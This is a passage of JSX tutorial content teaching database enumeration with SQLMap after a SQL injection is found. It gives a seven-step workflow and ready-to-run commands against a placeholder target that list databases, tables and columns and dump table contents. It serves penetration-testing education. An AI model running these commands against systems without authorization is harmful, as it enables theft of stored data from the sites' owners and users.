  <TabsContent value={"overview"}>
    SQLMap provides comprehensive capabilities for enumerating database structures and extracting valuable information once a SQL injection vulnerability has been identified. These techniques allow for systematic exploration of the database environment while maintaining control over the scope and impact of your security assessment.
  </TabsContent>
  <TabsContent value={"workflow"}>
    A typical database enumeration workflow follows these steps:
    
    1. **Identify SQL injection vulnerability**
    2. **Determine database type and version**
    3. **List available databases**
    4. **Enumerate tables in target databases**
    5. **List columns in sensitive tables**
    6. **Extract valuable data**
    7. **Access file system (if needed and authorized)**
    
    This methodical approach ensures thorough exploration while minimizing unnecessary actions.
  </TabsContent>
  <TabsContent value={"commands"}>
    Essential SQLMap enumeration commands:
    
    ```bash
    # Get current database name
    sqlmap -u "http://target.com/vuln.php?id=1" --current-db
    
    # List all databases
    sqlmap -u "http://target.com/vuln.php?id=1" --dbs
    
    # List tables in a database
    sqlmap -u "http://target.com/vuln.php?id=1" -D dbname --tables
    
    # List columns in a table
    sqlmap -u "http://target.com/vuln.php?id=1" -D dbname -T tablename --columns
    
    # Dump data from a table
    sqlmap -u "http://target.com/vuln.php?id=1" -D dbname -T tablename --dump
    ```
  </TabsContent>
